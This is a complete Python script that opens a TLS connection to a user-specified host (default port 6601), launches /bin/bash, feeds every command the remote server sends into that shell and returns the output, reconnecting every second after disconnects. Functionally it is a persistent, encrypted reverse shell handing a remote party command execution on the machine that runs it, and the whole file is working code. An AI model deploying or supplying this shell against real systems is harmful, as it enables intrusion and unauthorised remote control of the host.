#!/usr/bin/python3 -u
import time
import subprocess
import os
import ssl
import socket
import select
import sys
import getopt

NAME = sys.argv[0]
argv = sys.argv[1:]
DEFAULT_CAFILE='rootCA.pem'
DEFAULT_PORT = 6601

def usage(out=sys.stderr):
    global NAME
    print('''Usage:
    %s [-p --port port_number] -h,--host host [-a --ca ca_file] [--help]
    [-p\t--port\tPort number on the server. By default, it is port 6601.]
    -h\t--host\tServer's host. Could be name or IP. Required.
    [-a\t--ca\tLocation of Certificate Authority file. Default: %s.]
    [--help\tShow this help text.]
    ''' % (NAME,DEFAULT_CAFILE))

SHORT_OPTIONS = 'p:a:h:'
LONG_OPTIONS = ['port=', 'ca=', 'host=', 'help']

def parse_arguments(argv):
    try:
        options, argv = getopt.gnu_getopt(argv, SHORT_OPTIONS, LONG_OPTIONS)
    except getopt.GetoptError:
        usage()
        return (argv,None)

    def parse_opt(x):
        return x if x[-1] != '=' else x[:-1]
    opt_to_names = {'--' + parse_opt(opt): parse_opt(opt)
                    for opt in LONG_OPTIONS}
    long_ind = 0
    for i in SHORT_OPTIONS:
        if i == ':':
            continue
        opt_to_names['-'+i] = parse_opt(LONG_OPTIONS[long_ind])
        long_ind += 1
    server_args = dict((opt_to_names[opt_name], opt)
                       for opt_name, opt in options)

    return argv,server_args

RETRY_WAIT=1

def check_options(server_args):
    ret = None
    if 'help' in server_args:
        return 0

    if 'host' not in server_args:
        return 2

    if 'port' in server_args:
        try:
            server_args['port'] = int(server_args['port'])
            if not (0 <= server_args['port'] <= 65535):
                print("Invalid port number", file=sys.stderr)
                ret = 2
        except ValueError:
            print("Port number must be integer", file=sys.stderr)
            ret = 2

    if ('ca' in server_args and not os.path.isfile(server_args['ca'])) \
       or not os.path.isfile(DEFAULT_CAFILE):
        print("Certificate Authority file must exist", file=sys.stderr)
        ret = 2

    return ret

def main(argv):
    argv,server_args = parse_arguments(argv)
    if server_args is None:
        return 2
    options_check = check_options(server_args)
    if options_check is not None:
        usage(sys.stdout if options_check == 0 else sys.stderr)
        return options_check

    while True:
        bash_proc = subprocess.Popen(["/bin/bash"], stdin=subprocess.PIPE,
                                     stdout=subprocess.PIPE, bufsize=0)
        try:
            run_server(bash_proc, **server_args)
        except KeyboardInterrupt as e:
            print("Terminating")
            break
        # except Exception as e:
        #     print("Found exception:\n%s" % str(e))
        finally:
            bash_proc.kill()
        print("Retrying")
        time.sleep(RETRY_WAIT)
    return 0

# From:
# http://stackoverflow.com/questions/287871/print-in-terminal-with-colors-using-python
SERVER_COLOR = '\033[01;31m'
ENDC = '\033[0m'

def run_server(comm, host, port=DEFAULT_PORT, ca=DEFAULT_CAFILE):
    context = ssl.create_default_context(cafile=ca)
    conn = context.wrap_socket(socket.socket(socket.AF_INET),
                               server_hostname=host)

    conn.connect((host,port))
    try:
        while True:
            read_list,_,_ = select.select([comm.stdout,conn],[],[])
            for r in read_list:
                if r == conn:
                    o = r.read()
                    if o == b'':
                        return 0
                    comm.stdin.write(o)
                    sys.stdout.write('%sserver%s > ' %
                                     (SERVER_COLOR, ENDC))
                    sys.stdout.write(o.decode("utf-8"))
                else:
                    o = comm.stdout.readline()
                    if (o == b''):
                        print("Bash has found an error, quit this connection")
                        return
                    sys.stdout.write(o.decode("utf-8"))
                    conn.send(o)
    finally:
        conn.close()

if __name__ == '__main__':
    sys.exit(main(argv))
